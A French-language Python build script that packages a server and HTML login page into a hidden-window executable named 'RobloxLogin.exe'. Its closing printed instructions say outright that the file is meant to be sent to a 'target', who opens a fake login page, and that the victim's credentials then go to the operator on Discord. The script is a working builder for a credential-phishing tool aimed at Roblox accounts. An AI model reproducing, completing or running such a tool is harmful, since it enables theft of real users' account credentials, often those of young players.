#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import shutil
import subprocess

def build():
    print("[*] Vérification des dépendances...")
    
    # Installer pyinstaller si pas présent
    try:
        import PyInstaller
        print("[+] PyInstaller déjà installé")
    except ImportError:
        print("[*] Installation de PyInstaller...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    # Installer requests si pas présent
    try:
        import requests
        print("[+] requests déjà installé")
    except ImportError:
        print("[*] Installation de requests...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    
    # Vérifier que index.html existe
    if not os.path.exists("index.html"):
        print("[-] Erreur: index.html introuvable dans le dossier courant")
        return
    
    print("[*] Compilation du serveur en exe...")
    
    # Inclure index.html dans l'exe via --add-data
    # Sur Windows, le séparateur est ; sur Linux/Mac c'est :
    separator = ";" if sys.platform == "win32" else ":"
    
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name", "RobloxLogin",
        f"--add-data=index.html{separator}.",
        "--distpath", ".",
        "server.py"
    ]
    
    subprocess.check_call(cmd)
    
    # Nettoyer les fichiers temporaires
    for folder in ["build", "__pycache__"]:
        if os.path.exists(folder):
            shutil.rmtree(folder)
    
    for file in ["server.spec"]:
        if os.path.exists(file):
            os.remove(file)
    
    print("\n[+] ✅ Exe créé avec succès !")
    print(f"[+] Fichier: RobloxLogin.exe (dans le dossier courant)")
    print(f"[+] Taille: {os.path.getsize('RobloxLogin.exe') / 1024:.1f} Ko")
    print("\n[!] Instructions:")
    print("    1. Envoie RobloxLogin.exe à la cible")
    print("    2. Quand la cible l'exécute, le serveur se lance sur le port 8080")
    print("    3. La cible doit ouvrir http://<IP>:8080 dans son navigateur")
    print("    4. Si la cible se connecte, tu reçois les identifiants sur Discord")


if __name__ == "__main__":
    build()